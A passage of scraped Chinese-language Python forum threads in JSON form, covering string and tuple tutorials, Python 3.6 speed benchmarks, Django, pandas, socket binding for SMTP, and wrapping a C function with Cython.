word'\n&gt;&gt;&gt; string.zfill(20)\n'0000000000hello word'\n</code></pre>\n<h4>去除值得两端空格</h4>\n<pre><code>&gt;&gt;&gt; var=\" ansheng \"\n&gt;&gt;&gt; var\n' ansheng '\n&gt;&gt;&gt; var.strip()\n'ansheng'\n</code></pre>\n<h2>str 类型和 bytes 类型转换</h2>\n<p>以 UTF-8 编码的时候，一个汉字是三个字节，一个字节是八位</p>\n<p><strong>3.5.x 实例</strong></p>\n<p>代码如下：</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nvar = \"中文\"\nfor n in var:\n    print(n)\n\nprint(\"================\")\n\nvar2 = \"zhongwen\"\nfor n in var2:\n    print(n)\n</code></pre>\n<p>执行结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day03/str.py\n中\n文\n================\nz\nh\no\nn\ng\nw\ne\nn\n</code></pre>\n<p><strong>2.7.x 实例</strong></p>\n<p>代码如下：</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nvar = \"中文\"\nfor n in var:\n    print(n)\n\nprint(\"================\")\n\nvar2 = \"zhongwen\"\nfor n in var2:\n    print(n)\n</code></pre>\n<p>执行结果</p>\n<pre><code>C:\\Python27\\python.exe F:/Python_code/sublime/Day03/str.py\n�\n�\n�\n�\n�\n�\n================\nz\nh\no\nn\ng\nw\ne\nn\n</code></pre>\n<p>通过上面的实例可以知道，<code>Python3.5.x</code>在输出中文或者英文的时候是按照一个字符一个字符来输出的，但是在<code>Python2.7.x</code>就不这样了，<code>Python2.7.x</code>是按照字节来进行输出的，可以看到在输出中文的时候是乱码的，而且还输出了六次，因为在 UTF-8 编码的情况下一个汉字是等于三个字节的，所以输出了六个乱码的字符。</p>\n<p>在 Python3.5.x 里面是既可以输出汉字，也可以把输出字节的，利用 bytes 这个方法， bytes 可以将字符串转换为字节</p>\n<pre><code>var=\"中文\"\nfor n in var:\n    print(n)\n    bytes_list = bytes(n, encoding='utf-8')\n    # 十六进制输出\n    print(bytes_list)\n    for x in bytes_list:\n        # 十进制,bin(x)二进制\n        print(x,bin(x))\n</code></pre>\n<p>输出的结果</p>\n<pre><code># 字符串\n中\n# 十六进制\nb'\\xe4\\xb8\\xad'\n# 228=十进制， 0b11100100=二进制\n228 0b11100100\n184 0b10111000\n173 0b10101101\n文\nb'\\xe6\\x96\\x87'\n230 0b11100110\n150 0b10010110\n135 0b10000111\n</code></pre>\n<p>b 代表十六进制，\\xe4 这样的是一个十六进制的字节</p>\n<h2>其他知识点</h2>\n<h3>索引</h3>\n<p>索引是指某个值在列表或别的数据类型中的一个位置</p>\n<p>定义一个列表，查看列表中<code>Linux</code>值对应在列表中的位置</p>\n<pre><code>&gt;&gt;&gt; list_os = [\"Windows\",\"Linux\",\"Mac\",\"Unix\"]\n&gt;&gt;&gt; list_os.index(\"Linux\")\n1\n&gt;&gt;&gt; list_os[1]\n'Linux'\n</code></pre>\n<h3>使用<code>\\</code>转义</h3>\n<p>Python 允许你对某些字符进行转义，以此来实现一些难以单纯用字符描述的效果</p>\n<pre><code># 常用的内容也转义也就是`\\n`和`\\t`了，`\\n`是用来换行的，`\\t`是用来代替一个`tab`键\n&gt;&gt;&gt; string=\"My \\n Name  \\t is\"\n&gt;&gt;&gt; print(string)\nMy\n Name    is\n</code></pre>\n<h3>使用<code>+</code>拼接</h3>\n<p>你可以使用<code>+</code>号将多个字符串或字符串变量拼接起来</p>\n<pre><code>&gt;&gt;&gt; a=\"my \"\n&gt;&gt;&gt; b=\"name \"\n&gt;&gt;&gt; c=\"is \"\n&gt;&gt;&gt; d=\"ansheng\"\n&gt;&gt;&gt; a+b+c+d\n'my name is ansheng'\n</code></pre>\n<h3>切片</h3>\n<p>切片操作符是序列名后跟一个方括号，方括号中有一对可选的数字，并用冒号分割。注意这与你使用的索引操作符十分相似。记住数是可选的，而冒号是必须的，切片操作符中的第一个数表示切片开始的位置，第二个数表示切片到哪里结束，第三个数表示切片间隔数。如果不指定第一个数， Python 就从序列首开始。如果没有指定第二个数，则 Python 会停止在序列尾。注意，返回的序列从开始位置开始 ，刚好在结束位置之前结束。即开始位置是包含在序列切片中的，而结束位置被排斥在切片外。</p>\n<pre><code>&gt;&gt;&gt; os=\"Linux\"\n&gt;&gt;&gt; os\n'Linux'\n&gt;&gt;&gt; os[0:2]\n'Li'\n&gt;&gt;&gt; os[0:4:2]\n'Ln'\n</code></pre>\n<p>更多实例如下</p>\n<p>|切片符|说明|\n|:--|:--|\n|[:]|提取从开头到结尾的整个字符串|\n|[start:]|从 start 到结尾的字符串|\n|[:end]|从开头提取到 end - 1|\n|[start:end]|从 start 提取到 end - 1|\n|[start:end:setp]|从 start 提取到 end-1 ，每 setp 个字符提取一个|</p>\n<p>索引和切片同时适用于字符串、列表与元组</p>\n<ol>\n<li>索引通常用于查找某一个字符串或值</li>\n<li>切片通常用于查找某一个范围内的字符串或值</li>\n</ol>\n<p>实例：</p>\n<pre><code># 定义一个列表，列表内有三个元素\n&gt;&gt;&gt; var=[\"Linux\",\"Win\",\"Unix\"]\n# 通过索引取到了一个值\n&gt;&gt;&gt; var[0]\n'Linux'\n# 通过切片取到了多个值\n&gt;&gt;&gt; var[0:2]\n['Linux', 'Win']\n&gt;&gt;&gt; var[1:3]\n['Win', 'Unix']\n</code></pre>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way-string-data-type/\" rel=\"nofollow\">原文连接</a></p>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way/\" rel=\"nofollow\">Python 全栈之路系列文章</a></p>\n</div></div>"], "reply": "4", "tittle": "Python 全栈之路系列之字符串数据类型", "comment": ["哈哈，正好需要，感谢楼主。", " 谢谢关注，会一直持续更新。", "Python 全栈之路系列之数据类型(二)   这篇文章 404", " 链接改了，没事，这里有总的。 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import time\nimport multiprocessing\n\ndef totaltime(ct):\n    st = time.time()\n    a = 100.33  \n    b = 23.33  \n    for v in range(ct):\n        b = 1 + b\n        c = a * b\n    print(\"total time:\", time.time()-st)\n\nct = 25000000\n\nif __name__ == '__main__':\n    for i in range(multiprocessing.cpu_count()):\n        p = multiprocessing.Process(target=totaltime, args=(ct,))\n        p.start()\n    for p in multiprocessing.active_children():\n        print('Child process name: ' + p.name + ' id: ' + str(p.pid))\n</code></pre>\n<p>这段代码以前要 5s ，现在同一台机器只要 3s 了</p>\n<pre><code>import sys, time\nstdout = sys.stdout\n\nBAILOUT = 16\nMAX_ITERATIONS = 1000\n\nclass Iterator:\n  def __init__(self):\n    print('Rendering...')\n    for y in range(-39, 39):\n      stdout.write('\\n')\n      for x in range(-39, 39):\n        i = self.mandelbrot(x/40.0, y/40.0)\n        \n        if i == 0:\n          stdout.write('*')\n        else:\n          stdout.write(' ')\n    \n  def mandelbrot(self, x, y):\n    cr = y - 0.5\n    ci = x\n    zi = 0.0\n    zr = 0.0\n    i = 0\n\n    while True:\n      i += 1\n      temp = zr * zi\n      zr2 = zr * zr\n      zi2 = zi * zi\n      zr = zr2 - zi2 + cr\n      zi = temp + temp + ci\n \t\t  \n      if zi2 + zr2 &gt; BAILOUT:\n        return i\n      if i &gt; MAX_ITERATIONS:\n        return 0\n\nt = time.time()\nIterator()\nprint('\\nPython Elapsed %.02f' % (time.time() - t))\n</code></pre>\n<p>这段以前要 1.2s ，现在同一台机器只要 0.95s 了</p>\n</div></div>"], "reply": "14", "tittle": "你们有没有发现 py3.6 运算速度变快了", "comment": ["跟 2.7 比比?", " \r", "你不能要求 win10 跟 win xp 比的", " 你的意思是 2.7 的运算速度更快？→_→", " \r", "你 @错人了", "运行 1000 遍取平均值再说", "python2 -V\r", "Python 2.7.10\r", "python2 t1.py\r", "Child process name: Process-1 id: 697\r", "Child process name: Process-3 id: 699\r", "Child process name: Process-4 id: 700\r", "Child process name: Process-2 id: 698\r", "('total time:', 11.26904296875)\r", "('total time:', 11.378209829330444)\r", "('total time:', 11.391005039215088)\r", "('total time:', 11.501654863357544)\r", "\r", "python3 -V\r", "Python 3.5.1\r", "python3 t1.py\r", "Child process name: Process-1 id: 707\r", "Child process name: Process-4 id: 710\r", "Child process name: Process-2 id: 708\r", "Child process name: Process-3 id: 709\r", "total time: 8.77907681465149\r", "total time: 8.84126591682434\r", "total time: 8.84130597114563\r", "total time: 8.845878839492798", "有可能是 range 的问题。 python3 优化了 range ，返回的是一个迭代器。", "python3.6 t1.py\r", "Child process name: Process-2 id: 1191\r", "Child process name: Process-1 id: 1190\r", "Child process name: Process-3 id: 1192\r", "Child process name: Process-4 id: 1193\r", "total time: 6.99714207649231\r", "total time: 7.0236029624938965\r", "total time: 7.036419868469238\r", "total time: 7.042246103286743", "测试代码改为： xrange 。\r", "\r", "python2 t1.py\r", "Child process name: Process-1 id: 1234\r", "Child process name: Process-3 id: 1236\r", "Child process name: Process-4 id: 1237\r", "Child process name: Process-2 id: 1235\r", "('total time:', 6.006057024002075)\r", "('total time:', 6.011800050735474)\r", "('total time:', 6.023754119873047)\r", "('total time:', 6.047795057296753)", "python3 任重道远啊。", "赶快干死 2.7", "py3 中的 range 就是 py2 中的 xrange", " 不是。 xrange 有长度限制，不能超越机器位长， py3 的 range 没有。", " Thx ，我再去了解一下"]},
{"content": ["<div class=\"topic_content\">对 php 不熟。。不知道是否可行</div>"], "reply": "13", "tittle": "如果想为 discuz 加新的功能，可以用 Python 来写吗？", "comment": ["不能。", "理论上可以, python 写 然后 用 php 调 py", "Python 写成 API ，然后 PHP 透过 API 拿结果。", "进程间通讯", "我之前做过类似的：给论坛加一个全文检索（当时 Sphinx 死活安不上，就用 Python 来搞了），通过 Python 单独开一个端口，返回 json 或者直接做一个网页返回结果都可以，也可以通过 Redis 这样的数据库进行通信", "专业 discuz 开发，欢迎联系咨询", "\r", "几年前看到的了，不知道还在更没有", "共享数据库然后随便搞ﾟ(ﾟ´Д｀ﾟ)ﾟ｡", "共享数据库，转发某些路径下的请求，订一套回话标准", "用 discuz 也不怕恶心着", "看你想加什么", "当成外部 API 来写什么语言都成。", "有难度只能说"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>元组(tuple)和列表的为唯一区别就是列表可以更改，元组不可以更改，其他功能与列表一样</p>\n<p>创建元组的两种方法</p>\n<p>第一种</p>\n<pre><code>ages = (11, 22, 33, 44, 55)\n</code></pre>\n<p>第二种</p>\n<pre><code>ages = tuple((11, 22, 33, 44, 55))\n</code></pre>\n<p>如果元祖内只有一个元素，那么需要加上一个逗号，否则就变成字符串了。</p>\n<pre><code>In [1]: t = (1)\n\nIn [2]: t\nOut[2]: 1\n\nIn [3]: type(t)\nOut[3]: int\n\nIn [4]: t = (1,)\n\nIn [5]: t\nOut[5]: (1,)\n\nIn [6]: type(t)\nOut[6]: tuple\n</code></pre>\n<h2>元组所具备的方法</h2>\n<p>查看列表中元素出现的次数</p>\n<blockquote>\n<p>count(self, value):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|value|元素的值|</p>\n<pre><code>&gt;&gt;&gt; ages = tuple((11, 22, 33, 44, 55))\n&gt;&gt;&gt; ages\n(11, 22, 33, 44, 55)\n&gt;&gt;&gt; ages.count(11)\n1\n</code></pre>\n<p>查找元素在元组中的位置</p>\n<blockquote>\n<p>index(self, value, start=None, stop=None):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|value|元素的值|\n|start|开始的位置|\n|stop|结束的位置|</p>\n<pre><code>&gt;&gt;&gt; ages = tuple((11, 22, 33, 44, 55))\n&gt;&gt;&gt; ages.index(11)\n0\n&gt;&gt;&gt; ages.index(44)\n3\n</code></pre>\n<p>列表嵌套</p>\n<pre><code>&gt;&gt;&gt; T = (1,2,3,4,5)\n&gt;&gt;&gt; (x * 2 for x in T)\n&lt;generator object &lt;genexpr&gt; at 0x102a3e360&gt;\n&gt;&gt;&gt; T1 = (x * 2 for x in T)\n&gt;&gt;&gt; T1\n&lt;generator object &lt;genexpr&gt; at 0x102a3e410&gt;\n&gt;&gt;&gt; for t in T1: print(t)\n... \n2\n4\n6\n8\n10\n</code></pre>\n<h2>元组嵌套修改</h2>\n<p>元组的元素是不可更改的，但是元组的元素的元素就可能是可以更改的</p>\n<pre><code>&gt;&gt;&gt; tup=(\"tup\",[\"list\",{\"name\":\"ansheng\"}])\n&gt;&gt;&gt; tup\n('tup', ['list', {'name': 'ansheng'}])\n&gt;&gt;&gt; tup[1]\n['list', {'name': 'ansheng'}]\n&gt;&gt;&gt; tup[1].append(\"list_a\")\n&gt;&gt;&gt; tup[1]\n['list', {'name': 'ansheng'}, 'list_a']\n</code></pre>\n<p>元组的元素本身是不可修改的，但是如果元组的元素是个列表或者字典那么就可以被修改</p>\n<h2>切片原地修改不可变类型</h2>\n<pre><code>&gt;&gt;&gt; T = (1,2,3)\n&gt;&gt;&gt; T = T[:2] + (4,)\n&gt;&gt;&gt; T\n(1, 2, 4)\n</code></pre>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way-tuple-data-type/\" rel=\"nofollow\">原文地址</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python 全栈之路系列之元组数据类型", "comment": []},
{"content": ["<div class=\"topic_content\">本地有 3 个静态 IP ，应该如何用 python 分别调用这 3 个 IP ，主要是用来 smtp 发送。\r<br>我原来的代码\r<br>def bound_socket(*a, **k):\r<br>\tsock = true_socket(*a, **k)\r<br>\tsock.bind((ipbind, 0))\r<br>\treturn sock\r<br>true_socket = socket.socket</div>"], "reply": "17", "tittle": "本地有 3 个静态 IP，应该如何用 Python 分别调用这 3 个 IP 进行操作", "comment": ["开 3 个进程，进程分别绑定到这 3 个静态 ip 上面。\r", "貌似没软用，还是会通过默认网关的那个 ip 出去。", " 我之前用上面的代码应该是被检测到了，所以来求解。", "开三个子进程，分别绑定三个 IP ， 主进程进行任务分发。", " 对方有可能检测出我的主 IP 吗？", "  \r", "\r", "不能。\r", "如果你想隐蔽，可以走代理。", "赞下头像", "LZ 百合控？", "最终走哪个网关是路由表决定的，跟你绑定那个 IP 无关。 socket 是网络层和传输层之间的接口，它无法决定你的数据包走哪个网关。你需要一个能操作数据链路层的库(即二层网络)，或者能操作系统路由表的库也行。推荐你使用 scapy ， scapy 是一个非常全面的网络库，能灵活的修改和发送二层、三层数据包，也能操作路由表。你可以用它直接发送二层网络包，把目的 MAC 改为你需要的网关的 MAC 就行。", "我擦，上面打错一个字。是“跟你绑定哪个 IP 无关”。\r", "\r", "另外我的回答有些草率了，你先说明一下你的网络情况吧。比如三个 ip 是什么，有几张网卡，网关是怎么配置的，路由表是怎样的。", " 我有 3 个 IP 是在同一个网卡下 默认 IP 一个，添加了另外 2 个 IP", " 我用的是 smtp ，也可以用 scapy 吗", "网关是怎么配置的？\r", "\r", "scapy 可以在二层网络发包，所以不管是什么协议都可以。", "你的头像让人浮想联翩，同学你是 做什么的 ？", " 不会走默认网关,是哪个源 IP 与目的 IP 通信,就走哪个源 IP 网关出去.", " VPS 上面一个 eth0 网卡上面配置 5 个同网段的 ip 地址，这个我是测试过的，走的是默认网关。", " 5 个同网段的默认网关都是相同的。", " 重新改正下，网关都是相同的，默认网关，系统就一个。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT ，</p>\n<p>Windows&gt;&gt;</p>\n<p>有的包最高支持到了 3.4 ，没有 3.4+的包支持，比如 py2exe 什么的。</p>\n<p>这种情况下，大家除了降级 python ，还有其他的办法解决吗？</p>\n<p>以上是举例子哈，不是针对py2exe，可别给“Pyinstaller支持3.5呀”这样的建议</p>\n</div></div>"], "reply": "8", "tittle": "求问 Python3.5 下如何使用低版本的编译环境或者包？", "comment": ["pyenv 呀", "pyenv +1", " 不是很清楚 windows 是否可行…", " 貌似不行。以前搜过", "好像有 pywin, py.exe （我猜这个可以装好几个 python 版本，重命名下什么的）\r", "来源:http://www.cnblogs.com/wilber2013/p/4774022.html", "提另外一个思路，环境切换到 bash on windows 如何？", " \r", ">py --help\r", "Python Launcher for Windows Version 3.6.150.1013\r", "\r", "usage: py [ launcher-arguments ] [ python-arguments ] script [ script-arguments ]\r", "\r", "Launcher arguments:\r", "\r", "-2     : Launch the latest Python 2.x version\r", "-3     : Launch the latest Python 3.x version\r", "-X.Y   : Launch the specified Python version\r", "-X.Y-32: Launch the specified 32bit Python version", " 不是我问呀，应该 @", " 。\r", "lz 看 ls 现成的方法吧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>django-rq 使用 django_redis,  redis.conf 未设置 password ， 突然报 NOAUTH Authentication required.</p>\n<p>settings ：</p>\n<pre><code>CACHES = {\n    \"default\": {\n        \"BACKEND\": \"django_redis.cache.RedisCache\",\n        \"LOCATION\": \"redis://127.0.0.1:6379/0\",\n        \"OPTIONS\": {\n            \"CLIENT_CLASS\": \"django_redis.client.DefaultClient\",\n        }\n    }\n}\n</code></pre>\n<p>redis.conf, requirepass 行 未打开注释</p>\n<pre><code># Warning: since Redis is pretty fast an outside user can try up to\n# 150k passwords per second against a good box. This means that you should\n# use a very strong password otherwise it will be very easy to break.\n#\n#requirepass foobared\n\n</code></pre>\n<p>django-rq exception</p>\n<pre><code>2017-01-13 02:50:13,312 DEBG 'rqworker_high' stderr output:\n    output = self.handle(*args, **options)\n  File \"/home/ec2-user/Envs/dev/local/lib/python2.7/site-packages/django_rq/management/commands/rqworker.py\", line 76, in handle\n    w.work(burst=options.get('burst', False))\n  File \"/home/ec2-user/Envs/dev/local/lib/python2.7/site-packages/rq/worker.py\", line 340, in work\n    self.register_birth()\n  File \"/home/ec2-user/Envs/dev/local/lib/python2.7/site-packages/rq/worker.py\", line 206, in register_birth\n    if self.connection.exists(self.key) and \\\n  File \"/home/ec2-user/Envs/dev/local/lib/python2.7/site-packages/redis/client.py\", line 838, in exists\n\n2017-01-13 02:50:13,312 DEBG 'rqworker_high' stderr output:\n    return self.execute_command('EXISTS', name)\n  File \"/home/ec2-user/Envs/dev/local/lib/python2.7/site-packages/redis/client.py\", line 565, in execute_command\n    return self.parse_response(connection, command_name, **options)\n  File \"/home/ec2-user/Envs/dev/local/lib/python2.7/site-packages/redis/client.py\", line 577, in parse_response\n\n2017-01-13 02:50:13,312 DEBG 'rqworker_high' stderr output:\n    response = connection.read_response()\n  File \"/home/ec2-user/Envs/dev/local/lib/python2.7/site-packages/redis/connection.py\", line 574, in read_response\n    raise response\n\n2017-01-13 02:50:13,313 DEBG 'rqworker_high' stderr output:\nredis.exceptions.ResponseError: NOAUTH Authentication required.\n\n</code></pre>\n</div></div>"], "reply": "1", "tittle": "django-rq 使用 django_redis， NOAUTH 异常", "comment": ["Try restarting redis server without the redis.conf file."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请问下图中红色错误提示可不可以定制？\n<img alt=\"Markdown\" src=\"http://p1.bpimg.com/1949/b3fc8701e25a50a0.png\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题解决了\n定义一个form就行\n例：</p>\n<pre><code>from django import forms\n\nclass BookForm(forms.ModelForm):\n    class Meta:\n        model = Book\n\n    def clean(self):\n        prince = self.cleaned_data.get('prince')\n        if isinstance(price, int):\n            raise forms.ValidationError(u'价格应为数字')\n        return self.cleaned_data\n</code></pre>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>class BookAmin(admin.ModelAdmin):\n    form = BookForm\n    llist_display = ('name', 'price')\n\n    def save_model(self, request, obj, form, change):\n        cdata = form.cleaned_data\n        obj.save()\n</code></pre>\n<p>admin 里加入 form = BookForm就行了，如果想要传值可以使用cleaned_data。</p>\n</div></div>"], "reply": "8", "tittle": "django admin.py 如何定制错误信息提示？", "comment": ["在 locale/zh_Hans/LC_MESSAGES/django.po 覆盖 django 原生的翻译？", "django 版本太低？ Settings 里面设置 LANGUAGE_CODE = 'zh-hans'  以后应该是中文的", " @", " 并不是要汉化，例如：红字“输入整数”调整为“价格应为数字”", " 我知道啊，这些中文内容就在国际化文件 django.po 里，你通过重写的方式把英文对应的中文 “输入整数”改为“价格应为数字”就好。", "关键词应该是 admin validate 你可以尝试搜索一下，我也搜索一下，如果有相关信息再回复。", "\r", "\r", "FYI", " 问题解决了参见附言", " 这样的话在其他需要显示输入整数的地方也会变成价格应为数字了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>咳咳，昨天发了一个帖子求问， <a href=\"https://www.v2ex.com/t/334251#reply5\" rel=\"nofollow\">https://www.v2ex.com/t/334251#reply5</a></h2>\n<h2>然后现在问题解决了</h2>\n<h2>于是就有了这个东西</h2>\n<p><img alt=\"\" src=\"https://ooo.0o0.ooo/2017/01/13/5878494a9468b.gif\"></p>\n<h2>本来想打包的，但是一直出错，而且打包之后又 10 几兆，就算了！</h2>\n<h2>感兴趣的可以看看 <a href=\"https://github.com/mzcyx/pythoncode/tree/master/baidu\" rel=\"nofollow\">https://github.com/mzcyx/pythoncode/tree/master/baidu</a></h2>\n</div></div>", "<div class=\"topic_content\">百度的图片外部不能用~~~所以改为 sm.ms 图床了</div>"], "reply": "11", "tittle": "PyQt4+百度识图=百度图床", "comment": [" 请帮忙移到 Python 节点。。。忘选节点了", "百度识图上传的图片不会过期吗", " 不知道。话说回来，我为什么写这个东西我也忘了", "按理说识图传的照片是临时的。楼主可以再观察观察。不过期的话记得给我提个 bug😂", " 😂 中出叛徒", "你能不能做个微博的图床 py\r", "如何解决微博 cookie 过期的问题？", " 百度的果然不能用，能上传，但是外部网站不能用，还是用 sm.ms 图床吧。。已改为 sm.ms 的 api 接口", " 微博的只能登陆", " 登录有验证码怎么办", " 带 session 获取验证码，手动输入", "这也叫图床？\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请教 pandas 问题</p>\n<p>测试数据如下：</p>\n<pre><code>df\n    name    type    number\n0   David   A       1234\n1   Tom    B       2233\n2   Jack    C       2244\n3   Allen    B       2355      \n</code></pre>\n<p>想在 df 后面插入一列，叫 df=['is_valid']</p>\n<p>此栏中的值主要用于判断对应行中各列数据的有效性：比如长度，是否为空值，或值是否为限定允许的值\n只要有一列的判断结果为 False ，<strong>is_valid</strong> 就为 Fals</p>\n<h2>有效条件依次为：</h2>\n<ul>\n<li><code>name</code> 列值： name 值非空 , is_valid = True ；否则为 False ；</li>\n<li><code>type</code> 列值： type 值在 ['A', 'B', 'C', 'D'] 中， is_valid = True ，否则为 False</li>\n<li><code>number</code> number 值长度为 4 ， is_valid = True ，否则为 False</li>\n</ul>\n<p>想法是，一列一列地判断，根据判断结果对 is_valid 栏的值进行修订 （ True or False )</p>\n<h2>先用空值填充</h2>\n<p><code>df['is_valid'] = ''</code></p>\n<h3>判断 name 列值是否为空</h3>\n<p><code>df['is_valid'] = df.name.notnull()</code></p>\n<p>此时查看 df['is_valid'] 值，大致为：</p>\n<pre><code>df['is_valid']\n\n0       True\n1       True\n2      False  (name 中值为空)\n3       True\n\n</code></pre>\n<h2>问题如下：</h2>\n<p>1 、如何让判断第二列的时候，当判断的结果为 False 时才会更新 <strong>is_valid</strong> 的值</p>\n<p>2 、如何判断 第二列 type 值在限定范围内，问号处怎么处理？\n<code>df['is_valid'] = df.type.?</code></p>\n<p>谢谢！</p>\n</div></div>"], "reply": "8", "tittle": "求助： Pandas 添加列，并根据其他列的值判断之后返回结果", "comment": ["困扰半天了，向各位大侠求助，先谢谢啦。", "哦，测试数据中  name 列第三个值，应该为空的，不好意思。", "![QQ 截图 20170113140200.png]( ", ")", "你那个 name 的判断我没太看明白，大概是这个套路，你琢磨一下", "![QQ 截图 20170113140529.png]( ", ")", "看下面这个吧，大概是这么个套路，上面少些了一个判断，不明白你可以加我 qq ，我教你", "用 df.eval()，很方便的：\r", "\r", " @", " 谢谢两位热心帮助\r", "\r", "最后用了 逻辑与判断来处理了\r", "\r", "```\r", "df['is_valid'] = df.name.notnull() & df.type.isin(['A', 'B', 'C', 'D']) & (df.number.str.len() == 4)\r", "```\r", "\r", "注意最后一个 条件，一定要括在括号里，运算符的优先级问题。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>地址：<a href=\"https://github.com/lambdalisue/jupyter-vim-binding\" rel=\"nofollow\">lambdalisue/jupyter-vim-binding: Jupyter meets Vim. Vimmer will fall in love</a>。感动到流泪……</p>\n<p>（ Markdown cell 要 shift+enter 才能渲染， control+enter 似乎 bug 了）</p>\n</div></div>", "<div class=\"topic_content\">因为在 Jupyter 里 vimfx/vimperator 之类的浏览器 vim 插件会失效，可以用 Control+Tab 切换出去。</div>"], "reply": "2", "tittle": "jupyter (ipython-notebook) 好用到爆的 vim 插件", "comment": ["挺不错的。 jupyter 里很方便复制代码", "666666666666666666666666666666666"]},
{"content": ["<div class=\"topic_content\">有一个 python 小程序，是给局域网的用户用的。现在就一台机器安装了 python,希望其他局域网里面的用户不需要安装 python 就可以执行这个程序，不用 exe 打包的方式，有办法实现吗，请前辈指点下。</div>"], "reply": "12", "tittle": "可以利用主机的环境执行 Python 脚本吗", "comment": ["基本就是 web 程序啦", "很好奇你这个小程序是做什么的", "想 goagent 那样把 Python 环境一起打包进去？", "看你的程序想做什么 \r", "1, 不想安装任何东西, 包括下载, 那只能走浏览器,走浏览器有两个方案\r", "  a, 做成 web 服务,局域网能走浏览器访问到\r", "  b, 用一些 python to js 的方案 比如 brython 也可以让他在浏览器执行,当然你需要提供个 http server 托管\r", "\r", "2, 可以下载一些东西, 如果接受 cygwin 环境 那可以试试 babun 这个在 win 下的自动化 cygwin 安装方案\r", "  如果连这种都不接受 但是可以接受像绿色软件那种, 可能需要找人帮你用个 cygwin 或者 mingw 环境编译个 python.exe 以及他的 dll 文件, 其实安装只是帮你搞定一些右键菜单 快捷方式 path 之类 这些你都可以不要的", "PyInstaller", "如果目标机有 jvm 的话可以用 Java ，参考 jsr223", "将安装 python 的机器开共享，共享出 python.exe ， 其他用户不用安装也可以使用", "如果是该脚本不涉及到本地机器操作，方法就有很多，比如 ssh 之类都行。如果涉及本地机器操作，脚本可以通过 ssh 连接到本地机器进行操作。其实直接打包最方便。", " 感谢你的认真解答，非常谢谢", " 有本地操作的， web 能行的通吗？或者你说的 ssh", " 前辈，这个小程序是用于本地 excel 操作的，用你所说的浏览器方案的 a 或者 b ，哪个更容易，或者说更适合做呢？", " a 吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原<code>square.c</code>程序如下，想把其中的<code>calc_area()</code>函数封装了给 Python 调用</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Square {\n    float length;\n    float width;\n};\n\ntypedef struct Square *sq;\n\nfloat calc_area(sq a) {\n    float s;\n    s = a-&gt;length * a-&gt;width;\n    return s;\n}\n\nint main() {\n    sq a;\n    a = malloc(sizeof(struct Square));\n    a-&gt;length = 10.0;\n    a-&gt;width = 3.0;\n\n    printf(\"%f\\n\", calc_area(a));\n}\n</code></pre>\n<p>我写了个头文件<code>square.h</code>如下，我很少写 C ，所以也不确定写的对不对</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Square {\n    float length;\n    float width;\n};\n\ntypedef struct Square *sq;\n\nfloat calc_area(sq a);\n</code></pre>\n<p>然后试着用 Cython ，写了<code>square_wrapper.pyx</code>如下，主要涉及到指针和自定义结构体，真不知道怎么写了，反正报错</p>\n<pre><code>cdef extern from 'square.h':\n\n    struct Square:\n        float length\n        float width\n\n    ctypedef struct Square *sq\n\n    float calc_area(sq a)\n\ndef c_area(a):\n    return calc_area(sq a)\n</code></pre>\n<p>请教熟悉 Cython 或者其他如 SWIG 的 V 友，这个简单的 C 程序该如何封装？\n已经困扰很久，万分感谢！</p>\n</div></div>"], "reply": "20", "tittle": "一个简单的 C 程序，函数参数是指针结构体，请问如何封装给 Python 调用", "comment": ["ctypes/cffi", " 谢谢，我去学习一下", "Square 结构 在 python 里面要用吗。 如果只是引用， 不实际使用里面的字段。 用 PyObject* 相互传递即可。\r", "你也可以直接将指针当作一个长整型数值， 需要的时候再强制转换为指针。", "ctypedef struct Square *sq 不符合 cython 语法, 把 struct 去掉\r", "\r", "要封装 Square 给 py 的话, 可以在 pyx 中定一个 cdef 的 class, 维护一个指向 struct Square 的指针. 把 cal_area 作为这个 cdef class 的方法\r", "\r", "\r", "\r", "这是封装 C 库的流程,如果是自定义的扩展模块 ,c/c++ -> cython  -> py 这样做其实略繁琐 .  \r", "完全可以直接 cython -> py, 简化给 py 写 C 扩展的是 cython 的目的之一.", "如果你用 golang ，我可以教你 cgo ，很简单。\r", "\r", "/*\r", "// go preamble\r", "#include \"foo.h\"\r", "*/\r", "import \"C\"\r", "\r", "func bar(){\r", "     C.foo()\r", "}", "我研究了一下，贴下代码吧。\r", "```\r", "root@arch area: # 首先是 area.h 和 area.c\r", "root@arch area: cat area.h \r", "#ifndef _AREA_H\r", "#define _AREA_H\r", "\r", "struct Square {\r", "    float length;\r", "    float width;\r", "};\r", "\r", "typedef struct Square *pSquare;\r", "\r", "float calc_area(pSquare);\r", "\r", "#endif /* area.h */\r", "root@arch area: cat area.c \r", "#include <stdio.h>\r", "#include <stdlib.h>\r", "\r", "#include \"area.h\"\r", "\r", "\r", "float calc_area(pSquare s) {\r", "    return s->length * s->width;\r", "}\r", "\r", "int main(void) {\r", "    pSquare s = (pSquare)malloc(sizeof(struct Square));\r", "    if (s == NULL) {\r", "        printf(\"memory not enough\");\r", "        exit(1);\r", "    }\r", "    s->length = 10.0;\r", "    s->width = 3.0;\r", "    printf(\"area of the square: %f\\n\", calc_area(s));\r", "    